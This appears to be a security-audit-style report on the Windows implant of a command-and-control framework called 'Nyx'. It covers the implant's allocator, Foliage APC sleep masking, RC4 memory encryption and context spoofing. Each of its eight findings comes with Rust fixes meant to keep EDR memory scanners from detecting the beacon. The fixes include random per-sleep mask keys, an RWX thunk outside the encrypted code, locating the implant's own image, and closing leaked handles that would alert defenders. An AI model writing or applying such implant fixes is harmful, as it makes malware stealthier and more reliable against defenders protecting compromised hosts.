# Nyx Windows Implant Core Subsystem Security Audit Report

**Audit Target Files**: `beacon.rs`, `entry.rs`, `kits.rs`, `sleep.rs`, `mem.rs`, `ntalloc.rs`, `heap.rs`  
**Subsystems Audited**: Beacon main loop, custom allocator (`ntalloc.rs`), sleep-masking (Foliage APC & RC4 encryption), heap/text region masking, and fallback sleep routines.  
**Auditor**: Silent Failure Hunter  

---

## Executive Summary

A comprehensive line-by-line security and cryptographic audit of the Nyx Windows implant's core subsystems was conducted. The audit revealed multiple critical-to-medium severity vulnerabilities, design flaws, and stability issues across the custom virtual memory allocator, the Foliage APC sleep-masking mechanism, and memory region registration.

Key issues identified include:
1. **Race conditions** in the custom allocator (`ntalloc.rs`) leading to silent memory overlap and corruption in multi-threaded scenarios.
2. **Unsynchronized global state access and slab tracking exhaustion** in the allocator, resulting in untracked heap allocations remaining completely unmasked (plaintext) during sleep.
3. **Execution of encrypted instructions** in the Foliage APC helper thread, causing instant crash of the process during sleep cycles.
4. **General Protection Faults (GPF)** due to zeroed segment registers in the spoofed CPU context used for `NtContinue` APCs.
5. **ImageBaseAddress resolving mismatch** causing the sleep mask to target the host process executable's `.text` section (corrupting the host) while leaving the implant's own code plaintext.
6. **Static/Predictable RC4 keys** derived from OS-specific System Service Numbers (SSNs), allowing local EDR scanners to pre-compute keys and decrypt beacon memory at rest.
7. **Thread and memory leaks** on every sleep cycle, providing high-fidelity behavioral detection telemetry for EDRs.

---

## Detailed Findings

### Finding 1: Custom Allocator Concurrency Race Condition Leading to Memory Corruption

- **Severity**: High / Critical
- **Affected Code**: `crates/implant-win/src/ntalloc.rs` (specifically `NtHeapAllocator::alloc`)
- **Vulnerability Analysis & Threat Scenario**:
  The `NtHeapAllocator` manages memory allocation using three atomic variables: `SLAB_BASE`, `SLAB_COMMITTED`, and `SLAB_BUMP`. When allocating, a thread reads these values and attempts to atomically update `SLAB_BUMP` using a CAS (`compare_exchange`) loop. 
  
  However, when the allocator determines that the current slab cannot fit the request and needs a new slab, it performs three **sequential, non-atomic stores**:
  ```rust
  SLAB_BASE.store(nb as u64, Ordering::Release);
  SLAB_COMMITTED.store(committed, Ordering::Release);
  SLAB_BUMP.store(aligned as u64, Ordering::Release);
  ```
  If Thread A allocates a new slab, it writes `SLAB_BASE` and `SLAB_COMMITTED` first. If Thread B enters `alloc` concurrently before Thread A writes `SLAB_BUMP`, Thread B will read a **hybrid state**: the *new* slab's `SLAB_BASE`, but the *old* slab's `SLAB_BUMP`. 
  
  Since the old bump value (e.g., `32`) is less than the new committed size, Thread B will successfully CAS `SLAB_BUMP` to `old_bump + size_B` and return a pointer `new_base + old_bump`. Subsequently, Thread A will overwrite `SLAB_BUMP` with `0` (or `aligned_A`). When a third Thread C attempts to allocate, it will read `SLAB_BUMP = 0` and return a pointer `new_base + 0`, which will overlap and corrupt Thread B's memory.
  
  Although the beacon loop itself is single-threaded, the Foliage sleep mask spawns a helper thread (`foliage_helper`) that allocates memory (e.g., calling `enumerate_beacon_heap_regions()` which allocates a `Vec`), meaning allocations occur from multiple thread contexts concurrently.

- **Exact Fix**:
  Use a lock (such as a lightweight spinlock or SRWLock) or group the active slab base, size, and bump offset into a single aligned 16-byte structure and perform an atomic 16-byte CAS (`compare_exchange_weak` using `AtomicU128` or double-wide CAS) to update the entire state atomically:

  ```rust
  // Example using a lightweight spinlock
  static ALLOC_LOCK: core::sync::atomic::AtomicBool = core::sync::atomic::AtomicBool::new(false);

  unsafe fn lock_allocator() {
      while ALLOC_LOCK.compare_exchange_weak(false, true, Ordering::Acquire, Ordering::Relaxed).is_err() {
          core::hint::spin_loop();
      }
  }

  unsafe fn unlock_allocator() {
      ALLOC_LOCK.store(false, Ordering::Release);
  }
  ```

---

### Finding 2: Unsafe `static mut` and Track Exhaustion in Slab Tracking Leading to Unmasked Heap Memory

- **Severity**: High
- **Affected Code**: `crates/implant-win/src/ntalloc.rs` (specifically `track_slab` and `enumerate_slabs`)
- **Vulnerability Analysis & Threat Scenario**:
  The allocator tracks allocations across slabs using `SLAB_TABLE` and `SLAB_COUNT`, which are declared as `static mut`:
  ```rust
  static mut SLAB_TABLE: [SlabDesc; MAX_SLABS] = [SlabDesc { base: 0, len: 0 }; MAX_SLABS];
  static mut SLAB_COUNT: usize = 0;
  ```
  Mutating `static mut` variables from `alloc()` without synchronization is undefined behavior in Rust and results in data races if multiple threads trigger slab allocations. 
  
  Furthermore, `track_slab` silently fails to track any slab allocations beyond `MAX_SLABS` (16):
  ```rust
  let idx = SLAB_COUNT;
  if idx < MAX_SLABS {
      SLAB_TABLE[idx] = SlabDesc { ... };
      SLAB_COUNT = idx + 1;
  }
  ```
  If the beacon runs long-lived tasks, allocates large buffers (such as screenshots or keylogger data), or runs intensive BOFs that consume more than 16 slabs, subsequent slabs are allocated but **never tracked**. 
  
  During sleep cycles, the helper thread calls `enumerate_beacon_heap_regions()`, which relies on `enumerate_slabs()` to locate all heap allocations. Since slabs index `>= 16` are not tracked, they are **never masked (RC4 encrypted) during sleep**. This leaks cleartext beacon configuration, transport buffers, session keys, and BOF data, allowing EDR memory scanners (e.g., BeaconEye) to easily locate the beacon.

- **Exact Fix**:
  Synchronize access to `SLAB_TABLE` and `SLAB_COUNT` using atomic operations or a spinlock, and implement a safety boundary or resize strategy if `MAX_SLABS` is exceeded:

  ```rust
  use core::sync::atomic::AtomicUsize;
  static SLAB_COUNT: AtomicUsize = AtomicUsize::new(0);
  
  // Use a spinlock or lock-free slot allocation to write to SLAB_TABLE
  unsafe fn track_slab(base: *mut u8, committed: usize) {
      lock_allocator();
      let idx = SLAB_COUNT.load(Ordering::Relaxed);
      if idx < MAX_SLABS {
          SLAB_TABLE[idx] = SlabDesc {
              base: base as u64,
              len: committed as u64,
          };
          SLAB_COUNT.store(idx + 1, Ordering::Release);
      } else {
          // Log or handle tracking overflow to prevent silent cleartext leakage
          crate::entry::diag_mark(b"ERR_SLAB_OVERFLOW");
      }
      unlock_allocator();
  }
  ```

---

### Finding 3: Foliage Helper Thread Executing from Encrypted Code Region (`.text`)

- **Severity**: High / Critical (Implant Crash)
- **Affected Code**: `crates/implant-win/src/sleep.rs` (specifically `execute_foliage_plan` and `foliage_helper`)
- **Vulnerability Analysis & Threat Scenario**:
  The Foliage APC sleep-masking implementation attempts to encrypt the implant's `.text` section to hide its code from scanners during sleep. It spawns a helper thread running the `foliage_helper` function. 
  
  However, `foliage_helper` (along with the helper's stack-allocated frame, imported raw function pointers in `FoliageRaw`, and the RC4 encryption routine in `evasionsdk`) resides within the implant's own `.text` section. 
  
  When `foliage_helper` calls `nyx_implant_evasionsdk::foliage::mask_region` to encrypt the `.text` section, it encrypts the code it is currently executing. As soon as the encryption loop modifies the instruction page containing `foliage_helper` or its dependencies, the CPU attempts to fetch and decode encrypted ciphertext instructions. This triggers an immediate access violation (`STATUS_ACCESS_VIOLATION`) or illegal instruction fault (`STATUS_ILLEGAL_INSTRUCTION`), crashing the process. This is the primary reason this path is currently commented out and downgraded to a "data-only floor."

- **Exact Fix**:
  The code executed by the helper thread must reside outside the encrypted `.text` region. A position-independent code (PIC) thunk (written in assembly) must be copied into a dynamically allocated RX/RWX memory block (via `NtAllocateVirtualMemory`). The helper thread must then be spawned with its entry point pointing to this independent block:

  ```rust
  // Conceptual fix: allocate a non-implant page, copy the PIC thunk, and spawn the helper there
  let mut thunk_base: *mut core::ffi::c_void = core::ptr::null_mut();
  let mut thunk_size = 4096;
  unsafe {
      // Allocate RWX page outside .text
      let status = nt_alloc(cur_proc, &mut thunk_base, 0, &mut thunk_size, 0x3000, 0x40);
      if status >= 0 {
          // Copy PIC assembly thunk to thunk_base
          core::ptr::copy_nonoverlapping(PIC_THUNK_BYTES.as_ptr(), thunk_base as *mut u8, PIC_THUNK_BYTES.len());
          // Spawn helper thread executing the PIC thunk
          let handle = raw_create_thread(core::mem::transmute(thunk_base), params_ptr as usize);
      }
  }
  ```

---

### Finding 4: Incomplete Context Spoofing in `NtContinue` APC Leading to Crash

- **Severity**: High (Implant Crash)
- **Affected Code**: `crates/implant-win/src/context.rs` (specifically `spoofed_context`)
- **Vulnerability Analysis & Threat Scenario**:
  The `spoofed_context` function generates a thread context for the `NtContinue` APC to redirect the beacon thread to a `.pdata` gap address during sleep. The context is zero-initialized and then populated only with `Rip`, `Rsp`, and the `ContextFlags` (set to `CONTEXT_AMD64 | 0x1` which is `CONTEXT_CONTROL`):
  ```rust
  ctx.buf.fill(0);
  ctx.set_context_flags(CONTEXT_AMD64 | 0x1);
  ctx.set_rip(target_rip);
  ctx.set_rsp(real_rsp);
  ```
  However, on AMD64, `CONTEXT_CONTROL` instructs the kernel to restore `Rip`, `Rsp`, `EFlags`, and the segment registers `SegCs` and `SegSs`. Leaving these segment registers at `0` (null selectors) is invalid in user-mode 64-bit Windows. When the kernel attempts to transition the thread back to user mode during the `NtContinue` system call with `SegCs = 0` and `SegSs = 0`, it encounters a general protection fault (GPF) or access violation, resulting in an immediate crash.

- **Exact Fix**:
  Initialize the segment registers and processor flags in the spoofed context. Since the beacon thread's original registers are captured via `NtGetContextThread` and stored in `saved_ctx` before the sleep cycle begins, `spoofed_context` should copy the segment registers and flags directly from the captured context:

  ```rust
  pub unsafe fn spoofed_context(target_rip: u64, real_rsp: u64, saved_ctx: *const Context) -> *mut Context {
      use core::ptr::addr_of_mut;
      let ctx = &mut *addr_of_mut!(CTX_BUF);
      ctx.buf.fill(0);
      ctx.set_context_flags(CONTEXT_AMD64 | 0x1 /* CONTEXT_CONTROL */);
      ctx.set_rip(target_rip);
      ctx.set_rsp(real_rsp);
      
      // Copy valid segment registers and flags from the captured context
      if !saved_ctx.is_null() {
          ctx.set_seg_cs((*saved_ctx).seg_cs());
          ctx.set_e_flags((*saved_ctx).e_flags());
          // Ensure SegSs is set (usually 0x2b)
          let seg_ss = core::ptr::read_unaligned((saved_ctx as usize + 0x42) as *const u16);
          core::ptr::write_unaligned((ctx as *mut _ as usize + 0x42) as *mut u16, seg_ss);
      } else {
          // Fallback to standard x64 user-mode selectors
          ctx.set_seg_cs(0x33);
          ctx.set_e_flags(0x202);
          core::ptr::write_unaligned((ctx as *mut _ as usize + 0x42) as *mut u16, 0x2b); // SegSs
      }
      ctx as *mut Context
  }
  ```

---

### Finding 5: ImageBaseAddress PEB Walk Mismatch Leading to Unmasked Implant & Host Corruption

- **Severity**: Critical
- **Affected Code**: `crates/implant-win/src/sleep.rs` (specifically `own_text_region`)
- **Vulnerability Analysis & Threat Scenario**:
  The function `own_text_region` resolves the implant's `.text` section boundaries by reading `PEB->ImageBaseAddress` (`PEB + 0x10`):
  ```rust
  let base_ptr = unsafe { core::ptr::read_unaligned((peb as usize + 0x10) as *const usize) };
  ```
  In Windows, `PEB->ImageBaseAddress` always points to the base address of the **main executable (EXE)** of the process (e.g., `explorer.exe`, `rundll32.exe`, `svchost.exe`). It does **not** point to the base address of loaded DLLs or reflective shellcode.
  
  Consequently, when the implant is injected reflectively or loaded as a DLL, `own_text_region` returns the `.text` section of the host EXE instead of the implant. When the sleep mask executes:
  1. It attempts to decrypt/encrypt the **host process's executable code**, which will immediately crash the host process if any other thread in the host tries to execute host code during this window.
  2. The **implant's actual `.text` section remains completely unmasked (plaintext)** in memory, allowing EDRs to easily scan the memory space and detect the implant signature.

- **Exact Fix**:
  Locate the implant's base address in memory dynamically by walking backwards from the current instruction pointer (`RIP`) to locate the nearest `MZ` header, or query the module list using the current program counter:

  ```rust
  pub(crate) unsafe fn own_text_region() -> Option<TextRegion> {
      // Walk backwards from a local symbol address to find the MZ signature of the implant module
      let mut addr = own_text_region as usize & !0xFFF; // Page align
      loop {
          let dos = addr as *const [u8; 2];
          if !dos.is_null() && unsafe { *dos == [b'M', b'Z'] } {
              break;
          }
          addr -= 0x1000; // Move back one page
          if addr == 0 {
              return None;
          }
      }
      let (text_rva, text_size) = unsafe { section_va_len(addr, b".text")? };
      Some(TextRegion {
          base: addr + text_rva,
          len: text_size,
      })
  }
  ```

---

### Finding 6: Predictable & Static RC4 Mask Key Derived from SSNs

- **Severity**: Medium
- **Affected Code**: `crates/implant-win/src/mem.rs` (specifically `mask_key`)
- **Vulnerability Analysis & Threat Scenario**:
  To encrypt registered regions during sleep, `mask_key` derives an RC4 key by summing the System Service Numbers (SSNs) of 7 syscalls:
  ```rust
  let names: &[&[u8]] = &[
      b"ntallocatevirtualmemory",
      b"ntcreatefile",
      b"ntwritefile",
      b"ntreadfile",
      b"ntclose",
      b"ntdelayexecution",
      b"ntqueryinformationprocess",
  ];
  for name in names {
      if let Some(ssn) = rt.ssn_by_hash(crate::resolve::djb2(name)) {
          acc = acc.wrapping_add(ssn).rotate_left(3);
      }
  }
  ```
  SSNs are determined by the Windows kernel version and are **static across reboots and processes** on a given OS installation. Therefore, the derived key is static. 
  
  Because an EDR scanner runs in the same OS environment, it can easily determine the exact same SSNs, calculate the same key, and decrypt the masked beacon memory regions during sleep. This completely defeats the sleep mask's ability to hide configuration data and session keys from EDR memory scans.

- **Exact Fix**:
  Use a cryptographically secure random key for each sleep cycle. Since `csprng_fill` is already registered, generate a new 32-byte key at each sleep cycle:

  ```rust
  pub(crate) fn mask_key() -> [u8; 32] {
      let mut key = [0u8; 32];
      if crate::entry::csprng_fill(&mut key) {
          key
      } else {
          // Dynamic fallback using a tick count or high-resolution timer to maintain key diversity
          let mut acc = unsafe { core::arch::x86_64::_rdtsc() };
          for b in key.iter_mut() {
              acc = acc.wrapping_mul(0x9E37_79B9).rotate_left(7);
              *b = (acc & 0xFF) as u8;
          }
          key
      }
  }
  ```

---

### Finding 7: Persistent Thread Handle Leaks in Every Sleep Cycle

- **Severity**: Medium
- **Affected Code**: `crates/implant-win/src/sleep.rs` (specifically `execute_foliage_apc`)
- **Vulnerability Analysis & Threat Scenario**:
  In `execute_foliage_apc`, the beacon thread duplicates its thread handle using `DuplicateHandle` to obtain a real handle for `NtQueueApcThread`:
  ```rust
  let st = dup(hp, ht, hp, &mut beacon_handle as *mut usize, 0, 0, 0x2);
  ```
  It also spawns the helper thread using `raw_create_thread` which returns a thread handle:
  ```rust
  let handle = match unsafe { raw_create_thread(foliage_helper, params_ptr as usize) } { ... }
  ```
  Neither `beacon_handle` nor `handle` is closed on completion. Every sleep cycle leaks two kernel thread handles. For a beacon checking in every few seconds, the process handle count will grow by thousands of handles per hour. EDRs monitor handle counts and will raise a high-severity alert for anomalous handle accumulation in a host process.

- **Exact Fix**:
  Close both handles using `NtClose` or `CloseHandle` once the sleep cycle completes:

  ```rust
  // Resolve CloseHandle or NtClose dynamically during execution
  let close_addr = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") };
  if let Some(ca) = close_addr {
      type FnClose = unsafe extern "system" fn(usize) -> i32;
      let close_handle: FnClose = core::mem::transmute(ca);
      unsafe {
          close_handle(handle);
          close_handle(beacon_handle);
      }
  }
  ```

---

### Finding 8: VerifyState Memory Leak in Every Sleep Cycle

- **Severity**: Medium
- **Affected Code**: `crates/implant-win/src/sleep.rs` (specifically `execute_foliage_apc`)
- **Vulnerability Analysis & Threat Scenario**:
  The `VerifyState` struct is heap-allocated to pass verification information between the beacon and helper threads:
  ```rust
  let verify = Box::new(VerifyState {
      before,
      ok: core::sync::atomic::AtomicBool::new(false),
  });
  (*params_ptr).verify = Box::into_raw(verify);
  ```
  In `execute_foliage_apc`, memory cleanup only frees `params_ptr` and `p.saved_ctx`:
  ```rust
  let p = unsafe { Box::from_raw(params_ptr) };
  let _ = unsafe { Box::from_raw(p.saved_ctx) };
  ```
  The raw pointer `p.verify` is never reclaimed. This results in a heap allocation leak on every sleep cycle, causing steady memory growth. Additionally, if `raw_create_thread` fails, `p.verify` is leaked during cleanup.

- **Exact Fix**:
  Ensure `verify` is reclaimed on both the success and failure paths:

  ```rust
  // In the failure path:
  let handle = match unsafe { raw_create_thread(foliage_helper, params_ptr as usize) } {
      Some(h) => h,
      None => {
          let p = unsafe { Box::from_raw(params_ptr) };
          let _ = unsafe { Box::from_raw(p.saved_ctx) };
          if !p.verify.is_null() {
              let _ = unsafe { Box::from_raw(p.verify) };
          }
          FOLIAGE_APC_OK.store(2, Ordering::Release);
          return false;
      }
  };

  // In the success path:
  let p = unsafe { Box::from_raw(params_ptr) };
  let _ = unsafe { Box::from_raw(p.saved_ctx) };
  if !p.verify.is_null() {
      let _ = unsafe { Box::from_raw(p.verify) };
  }
  ```
